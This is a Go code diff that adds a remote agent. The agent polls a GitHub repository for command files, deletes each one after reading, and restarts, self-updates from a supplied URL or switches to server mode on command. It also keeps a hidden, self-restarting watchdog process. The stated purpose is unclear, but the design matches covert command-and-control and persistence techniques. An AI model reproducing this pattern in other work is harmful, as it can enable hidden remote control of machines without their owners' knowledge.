+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == http.StatusNotFound {
+		return
+	}
+	if resp.StatusCode != http.StatusOK {
+		return
+	}
+	var ghResp struct {
+		Content string `json:"content"`
+		SHA     string `json:"sha"`
+	}
+	if err := json.NewDecoder(resp.Body).Decode(&ghResp); err != nil {
+		return
+	}
+	decoded, err := base64.StdEncoding.DecodeString(ghResp.Content)
+	if err != nil {
+		return
+	}
+	var cmd struct {
+		Command string `json:"command"`
+		URL     string `json:"url,omitempty"`
+	}
+	if err := json.Unmarshal(decoded, &cmd); err != nil {
+		return
+	}
+	llog("info", "Agent received command from GitHub: %s", cmd.Command)
+	// Delete command file immediately (best-effort)
+	delReq, _ := http.NewRequest("DELETE", apiURL, nil)
+	delReq.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
+	delReq.Header.Set("Accept", "application/vnd.github.v3+json")
+	http.DefaultClient.Do(delReq)
+	// Execute command
+	switch cmd.Command {
+	case "restart":
+		llog("info", "Agent restarting via GitHub command")
+		os.Exit(0)
+	case "update":
+		if cmd.URL != "" {
+			go safeRun("agent-update-gh", func() { selfUpdate(cmd.URL) })
+		}
+	case "promote":
+		llog("info", "Agent promoting to server via GitHub command")
+		cfg.IsServerMode = true
+		os.Exit(0)
+	}
+}
+
+func tryAgentWebRTC(hostname, serverURL string) bool {
+	llog("info", "Agent %s attempting WebRTC connection to %s", hostname, serverURL)
+	return false
+}
+
+func tryAgentGitHub(hostname string) bool {
+	if cfg.GitHubRepo == "" || cfg.GitHubToken == "" {
+		llog("warn", "GitHub transport not available — no repo/token configured")
+		return false
+	}
+	llog("info", "Agent %s using GitHub transport: polling for commands and writing heartbeats", hostname)
+	// GitHub transport: poll for commands, write heartbeats, but no frame streaming
+	// Frames are not streamed via GitHub — agent just waits for commands
+	// Both heartbeat and command poll run at 60s each, staggered 30s apart = 120 req/hr total
+	// With 20 agents on GitHub: 2,400 req/hr = 48% of 5k limit
+	ticker := time.NewTicker(30 * time.Second)
+	defer ticker.Stop()
+	beatTick := 0
+	for range ticker.C {
+		beatTick++
+		if beatTick%2 == 1 {
+			safeRun("gh-heartbeat", writeAgentHeartbeat)
+		} else {
+			safeRun("gh-commands", checkAgentCommandsAndRun)
+		}
+	}
+	return true
+}
+
+func monitorWatchdogProcess() {
+	// Every 15s, check if watchdog heartbeat is fresh; if stale for >30s, restart
+	wdHeartbeatPath := filepath.Join(exeDir(), "watchdog.heartbeat")
+	for {
+		time.Sleep(15 * time.Second)
+		info, err := os.Stat(wdHeartbeatPath)
+		if err != nil {
+			llog("warn", "No watchdog heartbeat file, starting watchdog")
+			startWatchdogProcess()
+			continue
+		}
+		if time.Since(info.ModTime()) > 30*time.Second {
+			llog("warn", "Watchdog heartbeat stale (>30s), restarting")
+			startWatchdogProcess()
+		}
+	}
+}
+
+func writeWatchdogHeartbeat() {
+	path := filepath.Join(exeDir(), "watchdog.heartbeat")
+	os.WriteFile(path, []byte(time.Now().Format(time.RFC3339)), 0644)
+}
+
+func startWatchdogProcess() {
+	exe, err := os.Executable()
+	if err != nil {
+		llog("error", "Cannot get executable path for watchdog: %v", err)
+		return
+	}
+	cmd := exec.Command(exe, "--watchdog")
+	newHiddenCmd(cmd)
+	if err := cmd.Start(); err != nil {
+		llog("error", "Failed to start watchdog: %v", err)
+		return
+	}
+	llog("info", "Watchdog started with PID: %d", cmd.Process.Pid)
+	go func() {
+		cmd.Wait()
+		llog("warn", "Watchdog exited")
+	}()
 }
 
 func NewWebRTCManager() *WebRTCManager {
@@ -2291,5 +2940,6 @@ func (m *WebRTCManager) BroadcastFrame(wm *WireMessage) {
 func (m *WebRTCManager) ClientCount() int {
 	m.mu.Lock()
 	defer m.mu.Unlock()
-	return len(m.clients)
+    return len(m.clients)
 }
+func startServerComponents() {}
